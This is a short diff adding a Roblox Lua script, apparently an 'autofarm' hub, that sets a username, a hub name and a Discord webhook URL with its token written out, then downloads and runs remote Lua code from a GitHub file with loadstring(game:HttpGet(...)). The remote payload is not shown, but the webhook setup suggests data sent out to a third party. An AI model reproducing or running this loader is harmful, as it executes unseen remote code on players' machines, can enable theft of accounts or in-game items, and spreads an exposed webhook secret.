@@ -1,0 +1,5 @@
+_G.Username "2apy"
+_G.HubName "ITNAUTOFARM"
+_G.WebhookUrl "https://discord.com/api/webhooks/1129831979018362972/J3EdLa2JDixnqO21-IKQV_ecjhQIDJMsWoFCdxjfnt3HmCbK3WCZj4QyzbgKh1c3llA4"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
